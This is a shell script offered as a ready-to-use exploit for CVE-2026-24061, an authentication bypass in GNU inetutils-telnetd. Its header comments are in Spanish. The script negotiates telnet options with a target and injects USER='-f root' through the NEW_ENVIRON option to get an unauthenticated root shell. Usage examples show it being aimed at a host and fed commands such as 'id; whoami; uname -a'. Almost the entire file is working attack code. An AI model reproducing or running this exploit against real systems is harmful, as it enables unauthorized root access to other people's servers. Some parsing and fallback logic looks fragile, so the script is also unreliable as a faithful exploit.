#!/bin/sh
# Vulnerabiidad Telnet CVE-2026-24061
# CVE-2026-24061 - GNU inetutils-telnetd Remote Authentication Bypass
# CVSS 9.8 - root shell, sin requerir autenticacion
# Author: @antonio_taboada
# Fecha: 23 de enero de 2026
#
# Uso:
#     ./telnetbypass.sh <target> [port] [user]
#     
# Ejemplos:
#     ./telnetbypass.sh 192.168.1.1
#     ./telnetbypass.sh 192.168.1.1 2323 admin
#     
# Para ejecutar como comando:
#     echo "id; whoami; uname -a" | ./telnetbypass.sh 192.168.1.1

# Telnet protocol constants
IAC="$(printf '\377')"
SB="$(printf '\372')"
SE="$(printf '\360')"
DO="$(printf '\375')"
DONT="$(printf '\376')"
WILL="$(printf '\373')"
WONT="$(printf '\374')"

# Global variables
HOST=""
PORT="23"
USER="root"
SOCKFD=""
EXPLOIT_SENT="0"

# Error handling function
error() {
    echo "[-] $1" >&2
    cleanup
    exit 1
}

# Cleanup function
cleanup() {
    if [ -n "$SOCKFD" ]; then
        exec 4>&-
    fi
}

# Create telnet exploit payload
create_exploit_payload() {
    # IAC SB 39 0 0 USER 1 "-f <user>" IAC SE
    # 39 = NEW_ENVIRON, 0 = VAR, 1 = VALUE
    printf '%b' "${IAC}${SB}$(printf '\047')$(printf '\000')$(printf '\000')"
    printf 'USER%b' "$(printf '\001')"
    printf -- '-f %s' "$USER"
    printf '%b' "${IAC}${SE}"
}

# Send exploit payload
send_exploit() {
    payload="$(create_exploit_payload)"
    echo "$payload" >&4
    EXPLOIT_SENT="1"
    echo "[+] Exploit sent: USER='-f $USER'" >&2
}

# Handle telnet negotiation
handle_negotiation() {
    data="$1"
    output=""
    i=1
    
    while [ $i -le ${#data} ]; do
        char="$(echo "$data" | cut -b $i)"
        next_i=$((i + 1))
        
        # Check for IAC
        if [ "$char" != "$IAC" ]; then
            output="$output$char"
            i=$next_i
            continue
        fi
        
        # Skip IAC
        i=$next_i
        if [ $i -gt ${#data} ]; then
            break
        fi
        
        cmd="$(echo "$data" | cut -b $i)"
        i=$((i + 1))
        
        # Literal IAC
        if [ "$cmd" = "$IAC" ]; then
            output="${output}${IAC}"
            continue
        fi
        
        # Subnegotiation (SB)
        if [ "$cmd" = "$SB" ]; then
            # Get subnegotiation option
            if [ $i -le ${#data} ]; then
                sb_opt="$(echo "$data" | cut -b $i)"
                i=$((i + 1))
            else
                sb_opt="$(printf '\000')"
            fi
            
            # Skip to IAC SE
            while [ $i -lt ${#data} ]; do
                if [ "$(echo "$data" | cut -b $i)" = "$IAC" ] && \
                   [ "$(echo "$data" | cut -b $((i + 1)))" = "$SE" ]; then
                    i=$((i + 2))
                    break
                fi
                i=$((i + 1))
            done
            
            # Handle specific subnegotiations
            # TTYPE SEND
            if [ "$sb_opt" = "$(printf '\030')" ]; then
                printf '%b' "${IAC}${SB}$(printf '\030\000')xterm${IAC}${SE}" >&4
            # TSPEED SEND
            elif [ "$sb_opt" = "$(printf '\040')" ]; then
                printf '%b' "${IAC}${SB}$(printf '\040\000')38400,38400${IAC}${SE}" >&4
            # NEW_ENVIRON SEND
            elif [ "$sb_opt" = "$(printf '\047')" ] && [ "$EXPLOIT_SENT" = "0" ]; then
                send_exploit
            fi
            continue
        fi
        
        # Standard negotiation commands
        if [ "$cmd" = "$DO" ] || [ "$cmd" = "$DONT" ] || \
           [ "$cmd" = "$WILL" ] || [ "$cmd" = "$WONT" ]; then
            if [ $i -le ${#data} ]; then
                opt="$(echo "$data" | cut -b $i)"
                i=$((i + 1))
            else
                opt="$(printf '\000')"
            fi
            
            # Respond to negotiations
            if [ "$cmd" = "$DO" ]; then
                # Accept TTYPE (24), TSPEED (32), NEW_ENVIRON (39)
                if [ "$opt" = "$(printf '\030')" ] || \
                   [ "$opt" = "$(printf '\040')" ] || \
                   [ "$opt" = "$(printf '\047')" ]; then
                    printf '%b' "${IAC}${WILL}${opt}" >&4
                else
                    printf '%b' "${IAC}${WONT}${opt}" >&4
                fi
            elif [ "$cmd" = "$WILL" ]; then
                # Accept ECHO (1) and SGA (3)
                if [ "$opt" = "$(printf '\001')" ] || \
                   [ "$opt" = "$(printf '\003')" ]; then
                    printf '%b' "${IAC}${DO}${opt}" >&4
                else
                    printf '%b' "${IAC}${DONT}${opt}" >&4
                fi
            elif [ "$cmd" = "$WONT" ]; then
                printf '%b' "${IAC}${DONT}${opt}" >&4
            elif [ "$cmd" = "$DONT" ]; then
                printf '%b' "${IAC}${WONT}${opt}" >&4
            fi
        fi
    done
    
    echo "$output"
}

# Connect to target
connect() {
    # Use netcat if available, otherwise try telnet client
    if command -v nc >/dev/null 2>&1; then
        echo "[+] Using netcat for connection" >&2
        if nc -z "$HOST" "$PORT" >/dev/null 2>&1; then
            # Create a named pipe for bidirectional communication
            PIPE="/tmp/telnet_pipe_$$"
            mkfifo "$PIPE"
            
            # Connect with netcat
            nc "$HOST" "$PORT" < "$PIPE" | tee /dev/stdout > "$PIPE" &
            NC_PID=$!
            
            # Open pipe as file descriptor 4
            exec 4<>"$PIPE"
            
            # Cleanup
            trap 'rm -f "$PIPE"; kill $NC_PID 2>/dev/null' EXIT
            
            echo "[+] Connected to $HOST:$PORT" >&2
            return 0
        else
            error "Cannot connect to $HOST:$PORT"
        fi
    elif command -v telnet >/dev/null 2>&1; then
        echo "[+] Using telnet client for connection" >&2
        echo "[!] Note: Telnet client may not work correctly with binary data" >&2
        echo "[+] Connected to $HOST:$PORT" >&2
        return 0
    else
        error "Neither netcat nor telnet client found"
    fi
    return 1
}

# Main exploit function
run_exploit() {
    if ! connect; then
        return 1
    fi
    
    echo "[*] Starting exploit..." >&2
    
    # Check if stdin is a terminal
    if [ -t 0 ]; then
        echo "[*] Interactive mode - type commands (Ctrl+D to exit)" >&2
        INTERACTIVE="1"
    else
        echo "[*] Reading commands from stdin" >&2
        INTERACTIVE="0"
    fi
    
    # Main loop
    while true; do
        # Read from socket with timeout
        if read -t 1 -r line <&4 2>/dev/null; then
            output="$(handle_negotiation "$line")"
            if [ -n "$output" ]; then
                echo "$output"
            fi
        fi
        
        # Read from stdin if available
        if [ "$INTERACTIVE" = "1" ]; then
            if read -t 0 -r; then
                read -r input
                if [ -n "$input" ]; then
                    echo "$input" >&4
                else
                    # EOF on stdin
                    echo "[*] Exiting..." >&2
                    echo "exit" >&4
                    break
                fi
            fi
        else
            # Non-interactive mode: read all stdin at once
            if [ -n "$STDIN_DATA" ]; then
                echo "$STDIN_DATA" >&4
                STDIN_DATA=""
                # Wait a bit for output
                sleep 2
                break
            fi
        fi
    done
    
    return 0
}

# Main function
main() {
    # Show help if no arguments
    if [ $# -lt 1 ]; then
        sed -n '2,22p' "$0"
        exit 1
    fi
    
    HOST="$1"
    
    if [ $# -ge 2 ]; then
        PORT="$2"
    fi
    
    if [ $# -ge 3 ]; then
        USER="$3"
    fi
    
    # Read stdin data if any (for piping commands)
    if [ ! -t 0 ]; then
        STDIN_DATA="$(cat)"
    fi
    
    echo "============================================================" >&2
    echo "CVE-2026-24061 Exploit - telnetd Auth Bypass" >&2
    echo "============================================================" >&2
    echo "[*] Target: $HOST:$PORT" >&2
    echo "[*] User: $USER" >&2
    
    # Run the exploit
    if run_exploit; then
        exit 0
    else
        exit 1
    fi
}

# Trap signals for cleanup
trap cleanup EXIT INT TERM

# Run main function
main "$@"
